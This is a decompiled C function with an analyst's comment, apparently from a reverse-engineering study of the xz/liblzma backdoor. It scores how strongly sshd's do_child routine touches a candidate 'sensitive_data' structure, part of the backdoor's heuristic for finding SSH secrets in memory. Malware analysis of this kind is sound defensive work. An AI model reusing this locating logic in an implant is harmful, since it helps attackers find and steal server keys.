// /home/kali/xzre-ghidra/xzregh/103870_sshd_get_sensitive_data_score_in_do_child.c
// Function: sshd_get_sensitive_data_score_in_do_child @ 0x103870
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_do_child(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Uses the string catalogue to locate `do_child` and counts how many memory operands touch the supplied pointer at offsets
 * 0 and +0x10. Touching the base is worth one point while seeing multiple hits on +0x10 yields up to two more, so routines
 * that read both halves of the struct bubble to the top. The tiny score (0–3) feeds into the aggregate heuristic that
 * selects the best candidate.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score_in_do_child
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL BVar1;
  long lVar2;
  u8 **ppuVar3;
  uint uVar4;
  byte bVar5;
  dasm_ctx_t insn_ctx;
  u8 *do_child_start;
  u8 *do_child_end;
  
  bVar5 = 0;
  uVar4 = 0;
  code_start = (u8 *)refs->entries[1].func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)refs->entries[1].func_end;
    BVar1 = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    uVar4 = (uint)(BVar1 != FALSE);
    ppuVar3 = &do_child_start;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)ppuVar3 = 0;
      ppuVar3 = (u8 **)((long)ppuVar3 + (ulong)bVar5 * -8 + 4);
    }
    BVar1 = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)&do_child_start,
                       (void *)((long)sensitive_data + 0x10));
    if (BVar1 != FALSE) {
      BVar1 = find_instruction_with_mem_operand
                        (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
                         (void *)((long)sensitive_data + 0x10));
      if (BVar1 == FALSE) {
        uVar4 = uVar4 + 1;
      }
      else {
        uVar4 = uVar4 + 2;
      }
    }
  }
  return uVar4;
}

